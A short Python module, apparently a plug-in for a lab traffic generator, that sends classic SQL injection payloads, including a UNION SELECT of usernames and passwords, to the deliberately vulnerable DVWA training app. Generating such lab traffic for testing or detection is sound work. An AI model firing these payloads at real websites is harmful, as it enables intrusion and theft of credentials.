"""SQL injection against DVWA: one GET with a classic injection string in the `id` parameter per step."""
import requests

ATTACK_TYPE = "sqli"
DEFAULT_RATE = 1.0

PAYLOADS = ["1' OR '1'='1", "1' OR '1'='1' -- -", "1' UNION SELECT user,password FROM users -- -",
            "1' AND 1=2 UNION SELECT NULL,@@version -- -", "1\"", "1' ORDER BY 3 -- -"]


def step(ctx):
    base = ctx.targets["dvwa"]
    requests.get(f"{base}/vulnerabilities/sqli/",
                 params={"id": ctx.rng.choice(PAYLOADS), "Submit": "Submit"},
                 cookies={"security": "low"}, timeout=ctx.timeout)
